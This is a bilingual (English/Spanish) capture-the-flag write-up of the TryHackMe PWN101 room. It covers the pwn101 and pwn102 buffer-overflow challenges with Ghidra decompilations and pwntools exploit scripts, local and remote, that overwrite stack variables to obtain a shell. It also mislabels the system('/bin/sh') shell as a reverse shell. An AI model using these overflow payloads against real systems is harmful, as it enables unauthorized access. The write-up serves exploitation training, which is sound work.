PWN101 TryHackMe Room

By abund4nt

July 19, 2024

Hi guys this time I bring you the write-up of the PWN101 room of TryHackMe, this room consists of 10 challenges about binary exploitation in 64-bit binaries, I have learned a lot doing these challenges and have been of great contribution to my knowledge.

En este writeup a resolver los siguientes challenges:

  • pwn101 (Exploiting Simple Buffer Overflow)
  • pwn102 (Buffer Overflow to modified variable values)
  • pwn103 (Execution Flow Hijacking)
  • pwn104 (Shellcode Execution)

Let’s go with the solutions!

pwn101

En este primer desafio nos entrenga un binario llamado pwn101.pwn101 y una instancia remota para conectarnos. El binario tiene las siguientes protecciones.

Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled

Vamos a utilizar Ghidra para ver la funcion main, el codigo que nos muestra la herramienta es el siguiente.

void main(void)

{
  char local_48 [60];
  int local_c;
  
  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}

Analisis del codigo fuente

Tenemos un buffer de 60 bytes definido en la variable local_48 y luego toma nuestro input con la variable gets(), si nuestro input es igual a la direccion de memoria 0x539 nos muestra un error, si no es igual nos da una reverse shell utilizando system("/bin/sh"). Esto lo podemos comprobar si ejecutamos el binario.

Estamos ante un Buffer Overflow ya que debemos superar los 60 bytes del buffer y conseguir la shell interactiva que nos da el programa.

Solution

Con el siguiente script logramos resolver el desafio en local.

from pwn import *

p = process('./pwn101-1644307211706.pwn101')

p.sendlineafter(b'Type the required ingredients to make briyani: \n', b'A' * 120)
p.interactive()

pwn102

En este desafio nos entrega un binario llamado pwn102.pwn102 y una instancia remota para conectarnos. El binario cuenta con las siguientes protecciones.

Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled

Utilizaremos Ghidra para ver la funcion main() del binario.

void main(void)

{
  undefined local_78 [104];
  int local_10;
  int local_c;
  
  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}

Analisis del codigo fuente

Vemos que define una variable llamada local_78 con un buffer de 104 bytes. Luego nos dice quenecesita las direcciones de memoria 0xbadf00d y 0xfee1dead, podemos comprobar esto al ejecutar el binario.

$ ./pwn102-1644307392479.pwn102

I need badf00d to fee1dead
Am I right? test
I'm feeling dead, coz you said I need bad food :(

Pero en verdad el binario espera que la variable local_c tenga un valor de 0xc0ff33 y local_10 tenga un valor de 0xc0d3, si ambas condiciones se cumplen nos entrega una shell interactiva. Entonces lo que tenemos que hacer es llenar el Buffer y modificar pasar el valor de las variables que esta esperando el binario.

Solucion

Utilizando el siguiente script lograremos resolver el desafio en local.

from pwn import *

# Process
p = process('./pwn102-1644307392479.pwn102')

# Payload
payload = b'A' * 104 + p32(0xc0d3) + p32(0xc0ff33)

p.sendlineafter(b'Am I right? ', payload)
p.interactive()

Al ejecutar el script nos dara una shell interactiva.

from pwn import *

def get_process():
    if len(sys.argv) != 2:
        print('Usage: python3 exploit-remote.py <ip:port>')
        exit(1)

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))

def main():
    conn = get_process()

    # Payload
    payload = b'A' * 104 + p32(0xc0d3) + p32(0xc0ff33)

    # Send payload
    conn.sendlineafter(b'Am I right? ', payload)
    conn.interactive()


if __name__ == '__main__':
    main()
